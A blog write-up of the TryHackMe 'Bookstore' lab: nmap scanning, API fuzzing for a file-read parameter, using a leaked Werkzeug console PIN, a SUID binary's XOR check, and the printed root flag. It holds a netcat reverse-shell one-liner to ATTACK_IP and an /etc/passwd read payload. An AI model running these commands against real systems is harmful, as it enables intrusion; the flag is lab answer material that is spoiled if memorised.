---
title: "Bookstore TryHackMe"
layout: post
date: 2023-09-29 19:00
tag: 
- TryHackMe
- Pentesting
- Bookstore
- Fuzzing
- Web
- Meduim
- API
image: https://tryhackme-images.s3.amazonaws.com/room-icons/aba19a5cfea503b401f5550cb1004e20.jpeg
headerImage: true
writeups: true
hidden: true # don't count this post in blog pagination
description: "A meduim TryHackMe box, with basic web enumeration and API fuzzing."
category: project
author: johndoe
externalLink: false
star: false
---

# Overview

A meduim TryHackMe box, with basic web enumeration and API fuzzing.

---

# Namp

```bash
nmap -A -T4 10.10.255.130   
Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-06 13:58 +01
Nmap scan report for 10.10.255.130
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After accessing the web page in port 80 I found :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140146.png>)

And port 5000 contains the following page :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140127.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140218.png>)

The /api endpoint found in robots.txt gives us information how to use the request to the api :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806140255.png>)

In the source code I found an interesting hint for LFI :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806142124.png>)

Also in the source code of main.js I found another hint, so it may be an indication that there is a version 1 :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806141934.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806142329.png>)

So there is actually a v1! Now, let’s fuzz the API (v1) to find a possible parameter that would allow to read arbitrary files :

```bash
wfuzz -w /usr/share/wordlists/dirb/common.txt --hc=404 "http://10.10.255.130:5000/api/v1/resources/books?FUZZ=/etc/passwd"
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143110.png>)

Found the vulnerable parameter! Now let's read /etc/passwd file :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143244.png>)

Referring to the hint found let's read the user flag :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806141934.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143609.png>)

Using **Gobuster** we can see the */console* endpoint :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143805.png>)

Now let's read the .bash_history file as mentioned in the hint to find the PIN for /console :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143531.png>)

PIN : 123-321-135

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806143932.png>)

The bellow blog from **HackTricks** show us how to exploit that :

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)

Now let's get a revshell :

```bash
__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACK_IP 9999 >/tmp/f').read();
```

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806144510.png>)

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806144343.png>)

I am in as sid user!

# PE

I found an interesting file with the SUID bit set :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806145653.png>)

I downloaded a copy of the binary and analyzed it in Ghidra. Below is the main() function :

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806145620.png>)

The program prompts for a number (local_1c), XORs it with `0x1116` and `0x5db3` (local_18) and compares the result with `0x5dcd21f4`. If they match, a root shell will be spawned.

Let’s do the reverse operation to get the correct value that will give us the ability to spawn a root shell:

![Alt text](<../../../assets/images/THMPics/Pasted image 20230806150722.png>)

# Root flag

<p>root@bookstore:~# id</p>
uid=0(root) gid=1000(sid) groups=1000(sid)
<p>root@bookstore:/root# cat /root/root.txt</p>
e29b05fba5b2a7e69c24a450893158e3

<br/>

# MACHINE PWNED!

<br/>

And that was it, I hope you enjoyed the writeup. If you have any questions you can [Contact Me](https://www.linkedin.com/in/hichamouardi).

<p>Happy Hacking!</p>